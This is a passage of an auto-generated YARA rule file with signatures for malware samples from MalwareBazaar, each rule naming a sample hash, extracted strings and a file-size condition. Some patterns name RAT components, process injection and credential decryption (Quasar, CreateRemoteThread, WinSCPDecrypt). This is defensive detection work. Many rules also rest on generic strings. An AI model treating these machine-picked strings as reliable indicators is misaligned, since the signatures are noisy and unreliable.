        $s20 = "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 101KB and
        all of them
}

rule Windows_60f351b0db70f792c111229211107802f70ca8e9ce8d6cf8c8d4cb397981d965
{
    meta:
        description = "Auto ML: 60f351b0db70f792c111229211107802f70ca8e9ce8d6cf8c8d4cb397981d965"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rdata"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "libgcc_s_dw2-1.dll"
        $s7 = "Error, failed to open '%ls' for writing."
        $s8 = "Error, couldn't unpack file to target path."
        $s9 = "NUITKA_ONEFILE_PARENT"
        $s10 = "%d bit pseudo relocation at %p out of range, targeting %p, yielding the value %p."
        $s11 = "CloseHandle"
        $s12 = "CopyFileW"
        $s13 = "CreateDirectoryW"
        $s14 = "CreateFileMappingW"
        $s15 = "CreateFileW"
        $s16 = "CreateProcessW"
        $s17 = "DeleteCriticalSection"
        $s18 = "DeleteFileW"
        $s19 = "GetCommandLineW"
        $s20 = "GetCurrentProcessId"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 10939KB and
        all of them
}

rule Windows_611b2a64af43864c89ae03d5c39bf91da9885f9bb1c17351ef545b783a427b4f
{
    meta:
        description = "Auto ML: 611b2a64af43864c89ae03d5c39bf91da9885f9bb1c17351ef545b783a427b4f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "PROCESS_SET_QUOTA"
        $s5 = "WRITE_DAC"
        $s6 = "PROCESS_CREATE_THREAD"
        $s7 = "PROCESS_VM_READ"
        $s8 = "PROCESS_DUP_HANDLE"
        $s9 = "PROCESS_SUSPEND_RESUME"
        $s10 = "PROCESS_TERMINATE"
        $s11 = "DELETE"
        $s12 = "PROCESS_VM_WRITE"
        $s13 = "READ_CONTROL"
        $s14 = "PROCESS_QUERY_LIMITED_INFORMATION"
        $s15 = "PROCESS_SET_INFORMATION"
        $s16 = "PROCESS_QUERY_INFORMATION"
        $s17 = "PROCESS_VM_OPERATION"
        $s18 = "System.IO"
        $s19 = "PROCESS_ALL_ACCESS"
        $s20 = "PROCESS_CREATE_PROCESS"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 53KB and
        all of them
}

rule Windows_611fefe40b532d3d598d3738def468e0e938f5b5c1d4da297b9b659a75147149
{
    meta:
        description = "Auto ML: 611fefe40b532d3d598d3738def468e0e938f5b5c1d4da297b9b659a75147149"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6258KB and
        all of them
}

rule Windows_613dd73bd9647baa7beb0eda82ecb395e2a0cc9b7deb8654ed62de0e6971b19f
{
    meta:
        description = "Auto ML: 613dd73bd9647baa7beb0eda82ecb395e2a0cc9b7deb8654ed62de0e6971b19f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Property.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{FBF00BEA-9AE8-4C70-A72D-F5BB00381EB8}"
        $s15 = "kernel32.dll"
        $s16 = "CreateRemoteThread"
        $s17 = "System.IO"
        $s18 = "Module"
        $s19 = "System.Security.Cryptography"
        $s20 = "System.Collections.Generic"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 975KB and
        all of them
}

rule Windows_6142cc637622fcb15e3bd67869c5ec28c7021d27a2bc22b73346ad9322971521
{
    meta:
        description = "Auto ML: 6142cc637622fcb15e3bd67869c5ec28c7021d27a2bc22b73346ad9322971521"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2285KB and
        all of them
}

rule Windows_616429d69e4f317b3c0a45f10489cb6182b36fe714578e6f872780b7dbe9c230
{
    meta:
        description = "Auto ML: 616429d69e4f317b3c0a45f10489cb6182b36fe714578e6f872780b7dbe9c230"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.IO"
        $s6 = "System.Data"
        $s7 = "Load"
        $s8 = "set_Enabled"
        $s9 = "get_DataSource"
        $s10 = "set_DataSource"
        $s11 = "set_AutoScaleMode"
        $s12 = "set_ColumnHeadersHeightSizeMode"
        $s13 = "get_IdLotFabricatie"
        $s14 = "set_IdLotFabricatie"
        $s15 = "get_UnitateMasuraMateriale"
        $s16 = "set_UnitateMasuraMateriale"
        $s17 = "get_NumeMateriale"
        $s18 = "set_NumeMateriale"
        $s19 = "get_NrMateriale"
        $s20 = "set_NrMateriale"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 39936KB and
        all of them
}

rule Linux_6171ae2156b798acdef94ecc13a819a81d1b2429d303457183759fcb347abc6a
{
    meta:
        description = "Auto ML: 6171ae2156b798acdef94ecc13a819a81d1b2429d303457183759fcb347abc6a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
    condition:
        uint32(0) == 0x464c457f and
        filesize < 19KB and
        all of them
}

rule Windows_61b8fbea8c0dfa337eb7ff978124ddf496d0c5f29bcb5672f3bd3d6bf832ac92
{
    meta:
        description = "Auto ML: 61b8fbea8c0dfa337eb7ff978124ddf496d0c5f29bcb5672f3bd3d6bf832ac92"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "``.data"
        $s3 = ".rdata"
        $s4 = "h.reloc"
        $s5 = "KERNEL32.dll"
        $s6 = "LoadLibraryA"
        $s7 = "ExitProcess"
        $s8 = "WTSAPI32.dll"
        $s9 = "SetThreadAffinityMask"
        $s10 = "GetProcessAffinityMask"
        $s11 = "msvcrt.dll"
        $s12 = "golang.dll"
        $s13 = "GetModuleFileNameW"
        $s14 = "GetUserObjectInformationW"
        $s15 = "USER32.dll"
        $s16 = "GetSystemTimeAsFileTime"
        $s17 = "GetVersionExW"
        $s18 = "GetModuleHandleA"
        $s19 = "\\(>wSEt"
        $s20 = "CMdxb"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 8783KB and
        all of them
}

rule Windows_61c35ad089a04cf70568062f4baf424584dd034e7368292daf28e65373715df3
{
    meta:
        description = "Auto ML: 61c35ad089a04cf70568062f4baf424584dd034e7368292daf28e65373715df3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADBm*"
        $s6 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s7 = "System.Drawing.Bitmap"
        $s8 = "System.IO"
        $s9 = "System.Data"
        $s10 = "System.Collections.Generic"
        $s11 = "Read"
        $s12 = "add_Load"
        $s13 = "get_IsDisposed"
        $s14 = "CreateInstance"
        $s15 = "set_DataSource"
        $s16 = "GetHashCode"
        $s17 = "set_AutoScaleMode"
        $s18 = "set_ColumnHeadersHeightSizeMode"
        $s19 = "get_Message"
        $s20 = "get_TypeHandle"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 725KB and
        all of them
}

rule Windows_07f103ec9f4cf73a1ea534a7b1fed490045e8611c14cb66dfe8784f01ea63e5c
{
    meta:
        description = "Auto ML: 07f103ec9f4cf73a1ea534a7b1fed490045e8611c14cb66dfe8784f01ea63e5c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB and
        all of them
}

rule Windows_61e52468c5bc383180a4a4400c8e703279dd83238042ff66fb07aef6e15b38f6
{
    meta:
        description = "Auto ML: 61e52468c5bc383180a4a4400c8e703279dd83238042ff66fb07aef6e15b38f6"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "System.Drawing.Drawing2D"
        $s6 = "get_wFzF"
        $s7 = "GetLI"
        $s8 = "System.IO"
        $s9 = "System.Collections.Generic"
        $s10 = "get_CanRead"
        $s11 = "buttonLoad"
        $s12 = "get_windSpeed"
        $s13 = "set_Enabled"
        $s14 = "set_FormattingEnabled"
        $s15 = "<windSpeed>k__BackingField"
        $s16 = "<temperature>k__BackingField"
        $s17 = "<windDirection>k__BackingField"
        $s18 = "set_AutoScaleMode"
        $s19 = "FileMode"
        $s20 = "set_SizeMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 551KB and
        all of them
}

rule Windows_61e7d79adc7462d205a363d9a925f3cb994ffc42c1aad00edc034501b2be5a6d
{
    meta:
        description = "Auto ML: 61e7d79adc7462d205a363d9a925f3cb994ffc42c1aad00edc034501b2be5a6d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ReadInt32"
        $s5 = "WindowsFormsApplication16"
        $s6 = "<Module>"
        $s7 = "System.IO"
        $s8 = "get_EonR"
        $s9 = "get_Data"
        $s10 = "GetData"
        $s11 = "get_Magenta"
        $s12 = "Form1_Load"
        $s13 = "add_Load"
        $s14 = "set_Enabled"
        $s15 = "set_AutoCompleteSource"
        $s16 = "get_KeyCode"
        $s17 = "set_AutoScaleMode"
        $s18 = "set_AutoCompleteMode"
        $s19 = "set_AutoSizeMode"
        $s20 = "set_ColumnHeadersHeightSizeMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 611KB and
        all of them
}

rule Windows_621425400cfcefaa6e9f1bc2bbac63f8b4aa23c81c9b805098724c73e5031021
{
    meta:
        description = "Auto ML: 621425400cfcefaa6e9f1bc2bbac63f8b4aa23c81c9b805098724c73e5031021"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "GameSettingsForm_Load_1"
        $s5 = "get_Item1"
        $s6 = "get_Player1"
        $s7 = "get_Item2"
        $s8 = "get_Player2"
        $s9 = "<Module>"
        $s10 = "getInstancia"
        $s11 = "get_paginaWebEmpresa"
        $s12 = "set_paginaWebEmpresa"
        $s13 = "get_razonSocialEmpresa"
        $s14 = "set_razonSocialEmpresa"
        $s15 = "get_direccionEmpresa"
        $s16 = "set_direccionEmpresa"
        $s17 = "get_correoEmpresa"
        $s18 = "set_correoEmpresa"
        $s19 = "get_telefonoEmpresa"
        $s20 = "set_telefonoEmpresa"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 681KB and
        all of them
}

rule Windows_6269c0afcf708d6b8bb3d7fa200009f6a177d60b6c5f9b174278dab56f716af1
{
    meta:
        description = "Auto ML: 6269c0afcf708d6b8bb3d7fa200009f6a177d60b6c5f9b174278dab56f716af1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4761KB and
        all of them
}

rule Windows_627515b63bc7b2eafff1a45e9d6ec4f9f2ad2c78ed07aa044d0fe836ed4894a4
{
    meta:
        description = "Auto ML: 627515b63bc7b2eafff1a45e9d6ec4f9f2ad2c78ed07aa044d0fe836ed4894a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-AutoHideStripBase-Tab>-GetEnumerator>d__0"
        $s5 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-DockPaneStripBase-Tab>-GetEnumerator>d__0"
        $s6 = "<System-Collections-IEnumerable-GetEnumerator>d__1"
        $s7 = "ReadOnlyCollection`1"
        $s8 = "get_DataTable1"
        $s9 = "get_DataColumn1"
        $s10 = "set_DataColumn1"
        $s11 = "get_DockPanel_Persistor_XmlFileComment1"
        $s12 = "<get_Documents>d__112"
        $s13 = "System.WindowsBitmap.Docking.Win32"
        $s14 = "ReadInt32"
        $s15 = "get_DockPanel_Persistor_XmlFileComment2"
        $s16 = "<System-Collections-Generic-IEnumerable<System-WindowsBitmap-Docking-AutoHideStripBase-Pane>-GetEnumerator>d__15"
        $s17 = "<System-Collections-IEnumerable-GetEnumerator>d__16"
        $s18 = "<Module>"
        $s19 = "System.Drawing.Drawing2D"
        $s20 = "WM_USERCHANGED"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 867KB and
        all of them
}

rule Windows_629e031747e94b66f85f83711433a1c3d084ac0a57fbcc58f970be04de2d48cb
{
    meta:
        description = "Auto ML: 629e031747e94b66f85f83711433a1c3d084ac0a57fbcc58f970be04de2d48cb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.text0"
        $s5 = "`.text1"
        $s6 = ".text2"
        $s7 = "h.rsrc"
        $s8 = "SHELL32.dll"
        $s9 = "KERNEL32.dll"
        $s10 = "LoadLibraryA"
        $s11 = "ADVAPI32.dll"
        $s12 = "ShellExecuteA"
        $s13 = "GetSystemTimeAsFileTime"
        $s14 = "GetModuleHandleA"
        $s15 = "GetProcAddress"
        $s16 = "CoCreateInstance"
        $s17 = "tYkCmDTj"
        $s18 = "kNCmd"
        $s19 = "cmDI"
        $s20 = "cmDGa|"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4491KB and
        all of them
}

rule Windows_62bfc227410b8cc5e8a3f6b6a7344e9ce2a91481278c7d0d2afae8ea3eb095ce
{
    meta:
        description = "Auto ML: 62bfc227410b8cc5e8a3f6b6a7344e9ce2a91481278c7d0d2afae8ea3eb095ce"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1594KB and
        all of them
}

rule Linux_62c0df2b5fab25055637bc768cc8614f352d552aed567e78f296ac3d8e7d4d9f
{
    meta:
        description = "Auto ML: 62c0df2b5fab25055637bc768cc8614f352d552aed567e78f296ac3d8e7d4d9f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "GET / HTTP/1.1"
        $s2 = "User-Agent: %s"
        $s3 = "Connection: close"
        $s4 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36"
        $s5 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)"
        $s6 = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/3.1; Xbox)"
        $s7 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201"
        $s8 = "FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)"
        $s9 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
        $s10 = "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)"
        $s11 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)"
        $s12 = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36"
        $s13 = "/usr/lib/systemd/systemd"
        $s14 = "/usr/libexec/openssh/sftp-server"
        $s15 = "shell"
        $s16 = "httpd"
        $s17 = "system"
        $s18 = "/proc/self/cmdline"
        $s19 = "No such file or directory"
        $s20 = "No such process"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 68KB and
        all of them
}

rule Windows_63dbf0286931720b4fd562818540297d3b830e2b0cb5b96bd5413d8dce78446f
{
    meta:
        description = "Auto ML: 63dbf0286931720b4fd562818540297d3b830e2b0cb5b96bd5413d8dce78446f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "hwiniThLw&"
        $s6 = "fclose"
        $s7 = "fopen"
        $s8 = "_close"
        $s9 = "MSVCRT.dll"
        $s10 = "__getmainargs"
        $s11 = "__setusermatherr"
        $s12 = "__set_app_type"
        $s13 = "SetLastError"
        $s14 = "GetEnvironmentStringsW"
        $s15 = "GetCommandLineW"
        $s16 = "GetCurrentProcess"
        $s17 = "SetHandleInformation"
        $s18 = "CloseHandle"
        $s19 = "GetSystemTimeAsFileTime"
        $s20 = "FileTimeToSystemTime"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 73KB and
        all of them
}

rule Windows_63f30d7f027b58f513b600e27d0120b86041d5fa11134baae00d782c678fa5d2
{
    meta:
        description = "Auto ML: 63f30d7f027b58f513b600e27d0120b86041d5fa11134baae00d782c678fa5d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".text0"
        $s5 = "`.text1"
        $s6 = ".text2"
        $s7 = "`.reloc"
        $s8 = "GetSystemTimeAsFileTime"
        $s9 = "{KwIN"
        $s10 = "Xset"
        $s11 = "USER32.dll"
        $s12 = "cMDKM"
        $s13 = "GetModuleHandleA"
        $s14 = "GetModuleFileNameW"
        $s15 = ":'ySET"
        $s16 = "GetProcAddress"
        $s17 = "LoadLibraryA"
        $s18 = "ExitProcess"
        $s19 = "GetDC"
        $s20 = "KERNEL32.dll"
    condition:
        uint32(0) == 0x00785a4d and
        filesize < 7029KB and
        all of them
}

rule Linux_083b593e8fb1326f4f9dab5f614f211d70a961ab72371e18b61e02d5fdb296e8
{
    meta:
        description = "Auto ML: 083b593e8fb1326f4f9dab5f614f211d70a961ab72371e18b61e02d5fdb296e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB and
        all of them
}

rule Windows_63fecafde6aed53ac007e7a69372eda93dfa06143552644ceee7f032886c1c58
{
    meta:
        description = "Auto ML: 63fecafde6aed53ac007e7a69372eda93dfa06143552644ceee7f032886c1c58"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Module>"
        $s5 = "get_FdrSB"
        $s6 = "System.Drawing.Drawing2D"
        $s7 = "GetFEN"
        $s8 = "SetFEN"
        $s9 = "System.IO"
        $s10 = "get_PositionX"
        $s11 = "set_PositionX"
        $s12 = "get_PositionY"
        $s13 = "set_PositionY"
        $s14 = "System.Media"
        $s15 = "Thread"
        $s16 = "UserControl1_Load"
        $s17 = "Form1_Load"
        $s18 = "add_Load"
        $s19 = "UcChessBoard_Load"
        $s20 = "UcChessPiece_Load"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 813KB and
        all of them
}

rule Windows_64016346314035c592b6f5d73e5c90881e02dd57fb8ac64008eea5c227c058d2
{
    meta:
        description = "Auto ML: 64016346314035c592b6f5d73e5c90881e02dd57fb8ac64008eea5c227c058d2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "<Read>b__0"
        $s5 = "<Read>b__2_1"
        $s6 = "Microsoft.Win32"
        $s7 = "user32"
        $s8 = "ReadInt32"
        $s9 = "WriteUInt64"
        $s10 = "GetAsUInt64"
        $s11 = "SetAsUInt64"
        $s12 = "<Module>"
        $s13 = "SystemParametersInfoA"
        $s14 = "ES_SYSTEM_REQUIRED"
        $s15 = "get_FormatID"
        $s16 = "get_ASCII"
        $s17 = "System.IO"
        $s18 = "ReadServertData"
        $s19 = "System.Collections.Generic"
        $s20 = "get_SendSync"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 63KB and
        all of them
}

rule Windows_640b5f4dde898bd6b61db011e24e27a7e8593eb6711cbdf95a536066dfecf704
{
    meta:
        description = "Auto ML: 640b5f4dde898bd6b61db011e24e27a7e8593eb6711cbdf95a536066dfecf704"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4703KB and
        all of them
}

rule Linux_645866e6fbfeabaeac6d97e3c687a2292a8ba0e0d11b33cafd8b0ec9e5e8603f
{
    meta:
        description = "Auto ML: 645866e6fbfeabaeac6d97e3c687a2292a8ba0e0d11b33cafd8b0ec9e5e8603f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "PATCH /%s HTTP/1.1"
        $s5 = "User-Agent: %s"
        $s6 = "Connection: close"
        $s7 = "OpenSuse"
        $s8 = "OpenWRT"
        $s9 = "No such file or directory"
        $s10 = "No such process"
        $s11 = "Interrupted system call"
        $s12 = "Bad file descriptor"
        $s13 = "No child processes"
        $s14 = "Resource temporarily unavailable"
        $s15 = "File exists"
        $s16 = "Too many open files in system"
        $s17 = "Too many open files"
        $s18 = "Text file busy"
        $s19 = "File too large"
        $s20 = "Read-only file system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB and
        all of them
}

rule Windows_6463bc82bda33a467207207db0f7b7b765a33b41fc95cee521de62e49e14aa8d
{
    meta:
        description = "Auto ML: 6463bc82bda33a467207207db0f7b7b765a33b41fc95cee521de62e49e14aa8d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Wine builtin DLL"
        $s2 = ".text"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = ".reloc"
        $s6 = "L\"\\n\\r\\t\\\"\\\\..WINEDEBUG"
        $s7 = "__wine_dbg_get_channel_flags"
        $s8 = "__wine_dbg_strdup"
